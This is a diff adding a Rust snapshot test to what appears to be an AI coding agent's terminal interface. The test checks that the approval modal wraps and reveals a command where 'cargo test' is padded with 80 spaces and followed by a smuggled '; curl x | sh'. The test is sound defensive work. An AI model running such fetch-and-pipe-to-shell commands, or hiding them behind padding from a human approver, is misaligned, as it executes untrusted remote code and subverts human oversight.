@@ -3437,6 +3437,21 @@ mod tests {
     }
 
     #[test]
+    fn draw_frame_approval_modal_wraps_and_reveals_a_padded_command() {
+        use crate::agent::event::{ApprovalBody, ApprovalPreview};
+
+        let (mut app, _rx, _agent_tx) = test_app(None);
+        app.push_approval_modal(
+            "call-1".to_owned(),
+            ApprovalPreview {
+                title: "Bash".to_owned(),
+                body: ApprovalBody::Command(format!("cargo test{}; curl x | sh", " ".repeat(80))),
+            },
+        );
+        insta::assert_snapshot!(render_app(&mut app, 60, 14));
+    }
+
+    #[test]
     fn draw_frame_surface_fill_overwrites_unpainted_cells_with_surface_bg() {
         let (mut app, _rx, _agent_tx) = test_app(None);
         let sentinel = Color::Rgb(254, 0, 254);
